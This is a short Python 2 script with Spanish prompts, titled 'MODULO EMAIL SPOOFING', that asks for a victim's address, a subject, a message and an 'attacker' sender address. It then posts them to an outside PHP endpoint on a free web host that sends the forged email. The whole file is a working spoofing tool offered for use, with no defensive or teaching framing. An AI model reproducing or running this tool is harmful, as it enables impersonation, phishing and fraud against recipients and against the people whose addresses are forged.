#!/usr/bin/python
 
# Importamos los modulos necesarios.
import requests
import sys,os,time
print "                                                    .-'''-.                    "
print "                                           .---.   '   _    \                  "
print "                   _________   _...._      |   | /   /` '.   \ .--.            "
print "                   \        |.'      '-.   |   |.   |     \  ' |__|             "
print "                    \        .'```'.    '. |   ||   '      |  '.--.     .|     "
print "   ____     _____    \      |       \     \|   |\    \     / / |  |   .' |_    "
print "  `.   \  .'    /     |     |        |    ||   | `.   ` ..' /  |  | .'     |   "
print "    `.  `'    .'      |      \      /    . |   |    '-...-'`   |  |'--.  .-'   "
print "      '.    .'        |     |\`'-.-'   .'  |   |               |  |   |  |     "
print "      .'     `.       |     | '-....-'`    |   |               |__|   |  |     "  
print "    .'  .'`.   `.    .'     '.             '---'                      |  '.'   "
print " '----'       '----'                                                  `'-'     "

print"================================================================================"
print"                              MODULO EMAIL SPOOFING                           "
print"                              MODULO EMAIL BY L4MP                            "
print"================================================================================"


Victima = raw_input("correo Victima:")
Asunto =  raw_input("Asunto del Mensaje:")
Mensaje = raw_input("Mensaje:")
Atacante = raw_input("Correo Atacante:")
url = "https://sixav.000webhostapp.com/spoof.php"
 
data = {'Correo':Victima ,'Asunto':Asunto , 'Mensaje':Mensaje , 'Correo2':Atacante, 'sub':'submit'}

openc = requests.post(url, data=data,)
kont = openc.content

if "Email enviado con exito" in kont:
	print"================================================================================"
	print"      ___           ___           ___       ___                       ___     "
	print"     |\__\         /\  \         /\__\     /\  \          ___        /\  \    "
	print"     |:|  |       /::\  \       /:/  /    /::\  \        /\  \       \:\  \   "
	print"     |:|  |      /:/\:\  \     /:/  /    /:/\:\  \       \:\  \       \:\  \  "
	print"     |:|__|__   /::\~\:\  \   /:/  /    /:/  \:\  \      /::\__\      /::\  \ "
	print" ____/::::\__\ /:/\:\ \:\__\ /:/__/    /:/__/ \:\__\  __/:/\/__/     /:/\:\__\ "
	print" \::::/~~/~    \/__\:\/:/  / \:\  \    \:\  \ /:/  / /\/:/  /       /:/  \/__/"
	print"  ~~|:|~~|          \::/  /   \:\  \    \:\  /:/  /  \::/__/       /:/  /     "
	print"    |:|  |           \/__/     \:\  \    \:\/:/  /    \:\__\       \/__/      "
	print"    |:|  |                      \:\__\    \::/  /      \/__/                  "
	print"     \|__|                       \/__/     \/__/                              "
	print"================================================================================"
        print"                            Felicidades email enviado                           "
        print "Correo Victima: "
        print  Victima
        print "Asunto: " 
        print  Asunto
        print "Mensaje:" 
        print  Mensaje
        print "Correo atacante: " 
        print  Atacante
        print"================================================================================"

else:
        print "Mensaje no enviado, agregue la informacion necesaria en los campos establecidos."

